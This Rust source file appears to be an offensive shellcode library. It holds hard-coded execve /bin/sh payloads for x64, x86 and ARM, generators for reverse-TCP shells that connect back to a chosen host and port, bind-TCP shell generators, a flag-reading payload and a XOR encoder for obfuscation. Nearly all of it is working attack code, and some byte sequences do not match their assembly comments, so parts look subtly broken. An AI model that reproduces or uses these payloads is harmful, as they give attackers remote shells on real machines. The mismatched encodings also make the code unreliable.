// Shellcode library with common payloads for multiple architectures
// No external assembler required - pure Rust implementation

use std::collections::HashMap;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Architecture {
    X86,
    X64,
    ARM,
    ARM64,
    MIPS,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Payload {
    ExecveShBin,
    ShellReverseTcp,
    ShellBindTcp,
    ReadFlag,
    Nop,
    Int3,
    Exit,
}

pub struct ShellcodeLibrary {
    shellcodes: HashMap<(Architecture, Payload), Vec<u8>>,
}

impl Default for ShellcodeLibrary {
    fn default() -> Self {
        Self::new()
    }
}

impl ShellcodeLibrary {
    pub fn new() -> Self {
        let mut lib = ShellcodeLibrary {
            shellcodes: HashMap::new(),
        };
        lib.init_x64_shellcodes();
        lib.init_x86_shellcodes();
        lib.init_arm_shellcodes();
        lib
    }
    
    fn init_x64_shellcodes(&mut self) {
        self.shellcodes.insert(
            (Architecture::X64, Payload::ExecveShBin),
            vec![
                0x48, 0x31, 0xf6,                   // xor rsi, rsi
                0x56,                               // push rsi
                0x48, 0xbf, 0x2f, 0x62, 0x69,       // movabs rdi, 0x68732f6e69622f
                0x6e, 0x2f, 0x73, 0x68, 0x00,
                0x57,                               // push rdi
                0x54,                               // push rsp
                0x5f,                               // pop rdi
                0x6a, 0x3b,                         // push 0x3b
                0x58,                               // pop rax
                0x99,                               // cdq
                0x0f, 0x05,                         // syscall
            ]
        );
        
        self.shellcodes.insert(
            (Architecture::X64, Payload::Exit),
            vec![
                0x48, 0x31, 0xff,                   // xor rdi, rdi
                0x6a, 0x3c,                         // push 0x3c
                0x58,                               // pop rax
                0x0f, 0x05,                         // syscall
            ]
        );
        
        self.shellcodes.insert(
            (Architecture::X64, Payload::Nop),
            vec![0x90],
        );
        
        self.shellcodes.insert(
            (Architecture::X64, Payload::Int3),
            vec![0xcc],
        );
        
        self.shellcodes.insert(
            (Architecture::X64, Payload::ReadFlag),
            vec![
                0x48, 0x31, 0xc0,                   // xor rax, rax
                0x48, 0x31, 0xf6,                   // xor rsi, rsi
                0x48, 0x31, 0xd2,                   // xor rdx, rdx
                0x48, 0xb8, 0x66, 0x6c, 0x61,       // movabs rax, "./flag.txt"
                0x67, 0x2e, 0x74, 0x78, 0x74,
                0x50,                               // push rax
                0x48, 0x89, 0xe7,                   // mov rdi, rsp
                0x48, 0xc7, 0xc0, 0x02, 0x00,       // mov rax, 2 (sys_open)
                0x00, 0x00,
                0x0f, 0x05,                         // syscall
                0x48, 0x89, 0xc7,                   // mov rdi, rax
                0x48, 0x31, 0xc0,                   // xor rax, rax
                0x48, 0x89, 0xe6,                   // mov rsi, rsp
                0x48, 0xc7, 0xc2, 0x00, 0x01,       // mov rdx, 256
                0x00, 0x00,
                0x0f, 0x05,                         // syscall (sys_read)
                0x48, 0xc7, 0xc0, 0x01, 0x00,       // mov rax, 1 (sys_write)
                0x00, 0x00,
                0x48, 0xc7, 0xc7, 0x01, 0x00,       // mov rdi, 1 (stdout)
                0x00, 0x00,
                0x0f, 0x05,                         // syscall
            ]
        );
    }
    
    fn init_x86_shellcodes(&mut self) {
        self.shellcodes.insert(
            (Architecture::X86, Payload::ExecveShBin),
            vec![
                0x31, 0xc0,                         // xor eax, eax
                0x50,                               // push eax
                0x68, 0x2f, 0x2f, 0x73, 0x68,       // push "//sh"
                0x68, 0x2f, 0x62, 0x69, 0x6e,       // push "/bin"
                0x89, 0xe3,                         // mov ebx, esp
                0x50,                               // push eax
                0x53,                               // push ebx
                0x89, 0xe1,                         // mov ecx, esp
                0xb0, 0x0b,                         // mov al, 0x0b
                0xcd, 0x80,                         // int 0x80
            ]
        );
        
        self.shellcodes.insert(
            (Architecture::X86, Payload::Exit),
            vec![
                0x31, 0xc0,                         // xor eax, eax
                0xb0, 0x01,                         // mov al, 1
                0xcd, 0x80,                         // int 0x80
            ]
        );
        
        self.shellcodes.insert(
            (Architecture::X86, Payload::Nop),
            vec![0x90],
        );
        
        self.shellcodes.insert(
            (Architecture::X86, Payload::Int3),
            vec![0xcc],
        );
    }
    
    fn init_arm_shellcodes(&mut self) {
        self.shellcodes.insert(
            (Architecture::ARM, Payload::ExecveShBin),
            vec![
                0x01, 0x30, 0x8f, 0xe2,             // add r3, pc, #1
                0x13, 0xff, 0x2f, 0xe1,             // bx r3
                0x78, 0x46,                         // mov r0, pc
                0x0c, 0x30,                         // add r0, #12
                0x01, 0x90,                         // str r0, [sp, #4]
                0x01, 0xa9,                         // add r1, sp, #4
                0x92, 0x1a,                         // mov r2, r2
                0x0b, 0x27,                         // mov r7, #11
                0x01, 0xdf,                         // svc 1
                0x2f, 0x62, 0x69, 0x6e, 0x2f,       // "/bin/sh"
                0x73, 0x68, 0x00,
            ]
        );
        
        self.shellcodes.insert(
            (Architecture::ARM, Payload::Exit),
            vec![
                0x01, 0x27,                         // mov r7, #1
                0x00, 0x20,                         // mov r0, #0
                0x01, 0xdf,                         // svc 1
            ]
        );
    }
    
    pub fn get(&self, arch: Architecture, payload: Payload) -> Option<Vec<u8>> {
        self.shellcodes.get(&(arch, payload)).cloned()
    }
    
    pub fn get_with_params(
        &self,
        arch: Architecture,
        payload: Payload,
        params: &HashMap<String, String>,
    ) -> Result<Vec<u8>, String> {
        match payload {
            Payload::ShellReverseTcp => {
                self.generate_reverse_shell(arch, params)
            }
            Payload::ShellBindTcp => {
                self.generate_bind_shell(arch, params)
            }
            _ => {
                self.get(arch, payload)
                    .ok_or_else(|| format!("Shellcode not found for {:?}/{:?}", arch, payload))
            }
        }
    }
    
    fn generate_reverse_shell(
        &self,
        arch: Architecture,
        params: &HashMap<String, String>,
    ) -> Result<Vec<u8>, String> {
        let host = params.get("lhost")
            .ok_or_else(|| "Missing required parameter: lhost".to_string())?;
        let port = params.get("lport")
            .ok_or_else(|| "Missing required parameter: lport".to_string())?
            .parse::<u16>()
            .map_err(|_| "Invalid port number".to_string())?;
        
        match arch {
            Architecture::X64 => Ok(self.build_x64_reverse_shell(host, port)?),
            Architecture::X86 => Ok(self.build_x86_reverse_shell(host, port)?),
            _ => Err(format!("Reverse shell not implemented for {:?}", arch)),
        }
    }
    
    fn build_x64_reverse_shell(&self, host: &str, port: u16) -> Result<Vec<u8>, String> {
        let ip_parts: Vec<&str> = host.split('.').collect();
        if ip_parts.len() != 4 {
            return Err("Invalid IP address format".to_string());
        }
        
        let ip_bytes: Vec<u8> = ip_parts.iter()
            .map(|s| s.parse::<u8>().map_err(|_| "Invalid IP octet"))
            .collect::<Result<Vec<u8>, _>>()
            .map_err(|e| e.to_string())?;
        
        let port_bytes = port.to_be_bytes();
        
        let mut shellcode = vec![
            0x48, 0x31, 0xc0,                       // xor rax, rax
            0x48, 0x31, 0xff,                       // xor rdi, rdi
            0x48, 0x31, 0xf6,                       // xor rsi, rsi
            0x48, 0x31, 0xd2,                       // xor rdx, rdx
            0x4d, 0x31, 0xc0,                       // xor r8, r8
            0x6a, 0x02,                             // push 2
            0x5f,                                   // pop rdi
            0x6a, 0x01,                             // push 1
            0x5e,                                   // pop rsi
            0x6a, 0x29,                             // push 41
            0x58,                                   // pop rax
            0x0f, 0x05,                             // syscall (socket)
            0x49, 0x89, 0xc0,                       // mov r8, rax
            0x48, 0x31, 0xc0,                       // xor rax, rax
            0x50,                                   // push rax
            0x5e,                                   // pop rsi
            0x66, 0xbe,                             // mov si, PORT
        ];
        shellcode.extend_from_slice(&port_bytes);
        
        shellcode.extend_from_slice(&[
            0xc1, 0xe6, 0x10,                       // shl esi, 16
            0x66, 0x83, 0xce, 0x02,                 // or si, 2
            0xc1, 0xe6, 0x08,                       // shl esi, 8
            0x80, 0xce,                             // or sil, IP[0]
        ]);
        shellcode.push(ip_bytes[0]);
        
        shellcode.extend_from_slice(&[
            0xc1, 0xe6, 0x08,                       // shl esi, 8
            0x80, 0xce,                             // or sil, IP[1]
        ]);
        shellcode.push(ip_bytes[1]);
        
        shellcode.extend_from_slice(&[
            0xc1, 0xe6, 0x08,                       // shl esi, 8
            0x80, 0xce,                             // or sil, IP[2]
        ]);
        shellcode.push(ip_bytes[2]);
        
        shellcode.extend_from_slice(&[
            0xc1, 0xe6, 0x08,                       // shl esi, 8
            0x80, 0xce,                             // or sil, IP[3]
        ]);
        shellcode.push(ip_bytes[3]);
        
        shellcode.extend_from_slice(&[
            0x56,                                   // push rsi
            0x54,                                   // push rsp
            0x5e,                                   // pop rsi
            0x4c, 0x89, 0xc7,                       // mov rdi, r8
            0x6a, 0x10,                             // push 16
            0x5a,                                   // pop rdx
            0x6a, 0x2a,                             // push 42
            0x58,                                   // pop rax
            0x0f, 0x05,                             // syscall (connect)
            0x6a, 0x03,                             // push 3
            0x5e,                                   // pop rsi
            0x48, 0xff, 0xce,                       // dec rsi
            0x6a, 0x21,                             // push 33
            0x58,                                   // pop rax
            0x4c, 0x89, 0xc7,                       // mov rdi, r8
            0x0f, 0x05,                             // syscall (dup2)
            0x75, 0xf3,                             // jnz loop
            0x6a, 0x3b,                             // push 59
            0x58,                                   // pop rax
            0x99,                                   // cdq
            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e,     // movabs rbx, "/bin/sh"
            0x2f, 0x73, 0x68, 0x00,
            0x53,                                   // push rbx
            0x54,                                   // push rsp
            0x5f,                                   // pop rdi
            0x0f, 0x05,                             // syscall (execve)
        ]);
        
        Ok(shellcode)
    }
    
    fn build_x86_reverse_shell(&self, host: &str, port: u16) -> Result<Vec<u8>, String> {
        let ip_parts: Vec<&str> = host.split('.').collect();
        if ip_parts.len() != 4 {
            return Err("Invalid IP address format".to_string());
        }
        
        let ip_bytes: Vec<u8> = ip_parts.iter()
            .map(|s| s.parse::<u8>().map_err(|_| "Invalid IP octet"))
            .collect::<Result<Vec<u8>, _>>()
            .map_err(|e| e.to_string())?;
        
        let port_bytes = port.to_be_bytes();
        
        let mut shellcode = vec![
            0x31, 0xdb,                             // xor ebx, ebx
            0xf7, 0xe3,                             // mul ebx
            0xb0, 0x66,                             // mov al, 102 (socketcall)
            0x53,                                   // push ebx
            0x43,                                   // inc ebx
            0x53,                                   // push ebx
            0x6a, 0x02,                             // push 2
            0x89, 0xe1,                             // mov ecx, esp
            0xcd, 0x80,                             // int 0x80
            0x93,                                   // xchg eax, ebx
            0x59,                                   // pop ecx
            0xb0, 0x3f,                             // mov al, 63 (dup2)
            0xcd, 0x80,                             // int 0x80
            0x49,                                   // dec ecx
            0x79, 0xf9,                             // jns loop
            0x68,                                   // push IP
        ];
        shellcode.extend_from_slice(&[ip_bytes[3], ip_bytes[2], ip_bytes[1], ip_bytes[0]]);
        
        shellcode.extend_from_slice(&[
            0x68, 0x02, 0x00,                       // push word 2 + port
        ]);
        shellcode.extend_from_slice(&port_bytes);
        
        shellcode.extend_from_slice(&[
            0x89, 0xe1,                             // mov ecx, esp
            0xb0, 0x66,                             // mov al, 102
            0x50,                                   // push eax
            0x51,                                   // push ecx
            0x53,                                   // push ebx
            0xb3, 0x03,                             // mov bl, 3
            0x89, 0xe1,                             // mov ecx, esp
            0xcd, 0x80,                             // int 0x80
            0x52,                                   // push edx
            0x68, 0x2f, 0x2f, 0x73, 0x68,           // push "//sh"
            0x68, 0x2f, 0x62, 0x69, 0x6e,           // push "/bin"
            0x89, 0xe3,                             // mov ebx, esp
            0x52,                                   // push edx
            0x53,                                   // push ebx
            0x89, 0xe1,                             // mov ecx, esp
            0xb0, 0x0b,                             // mov al, 11
            0xcd, 0x80,                             // int 0x80
        ]);
        
        Ok(shellcode)
    }
    
    fn generate_bind_shell(
        &self,
        arch: Architecture,
        params: &HashMap<String, String>,
    ) -> Result<Vec<u8>, String> {
        let port = params.get("lport")
            .ok_or_else(|| "Missing required parameter: lport".to_string())?
            .parse::<u16>()
            .map_err(|_| "Invalid port number".to_string())?;
        
        match arch {
            Architecture::X64 => Ok(self.build_x64_bind_shell(port)?),
            Architecture::X86 => Ok(self.build_x86_bind_shell(port)?),
            _ => Err(format!("Bind shell not implemented for {:?}", arch)),
        }
    }
    
    fn build_x64_bind_shell(&self, port: u16) -> Result<Vec<u8>, String> {
        let port_bytes = port.to_be_bytes();
        
        let mut shellcode = vec![
            0x6a, 0x29,                             // push 41
            0x58,                                   // pop rax
            0x6a, 0x02,                             // push 2
            0x5f,                                   // pop rdi
            0x6a, 0x01,                             // push 1
            0x5e,                                   // pop rsi
            0x99,                                   // cdq
            0x0f, 0x05,                             // syscall (socket)
            0x48, 0x97,                             // xchg rax, rdi
            0x52,                                   // push rdx
            0x66, 0xbe,                             // mov si, PORT
        ];
        shellcode.extend_from_slice(&port_bytes);
        
        shellcode.extend_from_slice(&[
            0x66, 0x52,                             // push si
            0x66, 0x6a, 0x02,                       // push word 2
            0x54,                                   // push rsp
            0x5e,                                   // pop rsi
            0x6a, 0x10,                             // push 16
            0x5a,                                   // pop rdx
            0x6a, 0x31,                             // push 49
            0x58,                                   // pop rax
            0x0f, 0x05,                             // syscall (bind)
            0x6a, 0x32,                             // push 50
            0x58,                                   // pop rax
            0x0f, 0x05,                             // syscall (listen)
            0x6a, 0x2b,                             // push 43
            0x58,                                   // pop rax
            0x99,                                   // cdq
            0x0f, 0x05,                             // syscall (accept)
            0x48, 0x97,                             // xchg rax, rdi
            0x6a, 0x03,                             // push 3
            0x5e,                                   // pop rsi
            0x48, 0xff, 0xce,                       // dec rsi
            0x6a, 0x21,                             // push 33
            0x58,                                   // pop rax
            0x0f, 0x05,                             // syscall (dup2)
            0x75, 0xf6,                             // jnz loop
            0x6a, 0x3b,                             // push 59
            0x58,                                   // pop rax
            0x99,                                   // cdq
            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e,     // movabs rbx, "/bin/sh"
            0x2f, 0x73, 0x68, 0x00,
            0x53,                                   // push rbx
            0x54,                                   // push rsp
            0x5f,                                   // pop rdi
            0x0f, 0x05,                             // syscall (execve)
        ]);
        
        Ok(shellcode)
    }
    
    fn build_x86_bind_shell(&self, port: u16) -> Result<Vec<u8>, String> {
        let port_bytes = port.to_be_bytes();
        
        let mut shellcode = vec![
            0x31, 0xdb,                             // xor ebx, ebx
            0xf7, 0xe3,                             // mul ebx
            0x53,                                   // push ebx
            0x43,                                   // inc ebx
            0x53,                                   // push ebx
            0x6a, 0x02,                             // push 2
            0x89, 0xe1,                             // mov ecx, esp
            0xb0, 0x66,                             // mov al, 102
            0xcd, 0x80,                             // int 0x80
            0x5b,                                   // pop ebx
            0x5e,                                   // pop esi
            0x52,                                   // push edx
            0x68, 0x00, 0x00, 0x00, 0x00,           // push 0.0.0.0
            0x66, 0x68,                             // push word PORT
        ];
        shellcode.extend_from_slice(&port_bytes);
        
        shellcode.extend_from_slice(&[
            0x43,                                   // inc ebx
            0x66, 0x53,                             // push word 2
            0x89, 0xe1,                             // mov ecx, esp
            0x6a, 0x10,                             // push 16
            0x51,                                   // push ecx
            0x50,                                   // push eax
            0x89, 0xe1,                             // mov ecx, esp
            0x6a, 0x66,                             // push 102
            0x58,                                   // pop eax
            0xcd, 0x80,                             // int 0x80
            0x89, 0x41, 0x04,                       // mov [ecx+4], eax
            0xb3, 0x04,                             // mov bl, 4
            0xb0, 0x66,                             // mov al, 102
            0xcd, 0x80,                             // int 0x80
            0x43,                                   // inc ebx
            0xb0, 0x66,                             // mov al, 102
            0xcd, 0x80,                             // int 0x80
            0x93,                                   // xchg eax, ebx
            0x59,                                   // pop ecx
            0x6a, 0x3f,                             // push 63
            0x58,                                   // pop eax
            0xcd, 0x80,                             // int 0x80
            0x49,                                   // dec ecx
            0x79, 0xf8,                             // jns loop
            0x68, 0x2f, 0x2f, 0x73, 0x68,           // push "//sh"
            0x68, 0x2f, 0x62, 0x69, 0x6e,           // push "/bin"
            0x89, 0xe3,                             // mov ebx, esp
            0x50,                                   // push eax
            0x53,                                   // push ebx
            0x89, 0xe1,                             // mov ecx, esp
            0xb0, 0x0b,                             // mov al, 11
            0xcd, 0x80,                             // int 0x80
        ]);
        
        Ok(shellcode)
    }
    
    pub fn encode_xor(&self, shellcode: &[u8], key: u8) -> Vec<u8> {
        shellcode.iter().map(|&b| b ^ key).collect()
    }
    
    pub fn encode_alphanumeric(&self, _shellcode: &[u8]) -> Result<Vec<u8>, String> {
        Err("Alphanumeric encoding not yet implemented".to_string())
    }
}

pub fn parse_arch(s: &str) -> Result<Architecture, String> {
    match s.to_lowercase().as_str() {
        "x86" | "i386" | "ia32" => Ok(Architecture::X86),
        "x64" | "x86_64" | "amd64" => Ok(Architecture::X64),
        "arm" | "armv7" => Ok(Architecture::ARM),
        "arm64" | "aarch64" => Ok(Architecture::ARM64),
        "mips" => Ok(Architecture::MIPS),
        _ => Err(format!("Unknown architecture: {}", s)),
    }
}

pub fn parse_payload(s: &str) -> Result<Payload, String> {
    match s.to_lowercase().replace("-", "_").replace("/", "_").as_str() {
        "execve" | "sh" | "shell" | "execve_sh" => Ok(Payload::ExecveShBin),
        "reverse" | "reverse_tcp" | "shell_reverse_tcp" => Ok(Payload::ShellReverseTcp),
        "bind" | "bind_tcp" | "shell_bind_tcp" => Ok(Payload::ShellBindTcp),
        "read_flag" | "flag" => Ok(Payload::ReadFlag),
        "nop" => Ok(Payload::Nop),
        "int3" | "breakpoint" => Ok(Payload::Int3),
        "exit" => Ok(Payload::Exit),
        _ => Err(format!("Unknown payload: {}", s)),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shellcode_library() {
        let lib = ShellcodeLibrary::new();
        
        let sh = lib.get(Architecture::X64, Payload::ExecveShBin);
        assert!(sh.is_some());
        assert!(!sh.unwrap().is_empty());
        
        let exit = lib.get(Architecture::X64, Payload::Exit);
        assert!(exit.is_some());
    }

    #[test]
    fn test_reverse_shell() {
        let lib = ShellcodeLibrary::new();
        let mut params = HashMap::new();
        params.insert("lhost".to_string(), "127.0.0.1".to_string());
        params.insert("lport".to_string(), "4444".to_string());
        
        let result = lib.get_with_params(Architecture::X64, Payload::ShellReverseTcp, &params);
        assert!(result.is_ok());
        assert!(!result.unwrap().is_empty());
    }

    #[test]
    fn test_bind_shell() {
        let lib = ShellcodeLibrary::new();
        let mut params = HashMap::new();
        params.insert("lport".to_string(), "4444".to_string());
        
        let result = lib.get_with_params(Architecture::X64, Payload::ShellBindTcp, &params);
        assert!(result.is_ok());
        assert!(!result.unwrap().is_empty());
    }

    #[test]
    fn test_xor_encoding() {
        let lib = ShellcodeLibrary::new();
        let shellcode = vec![0x41, 0x42, 0x43];
        let encoded = lib.encode_xor(&shellcode, 0xAA);
        assert_eq!(encoded, vec![0xEB, 0xE8, 0xE9]);
    }
}
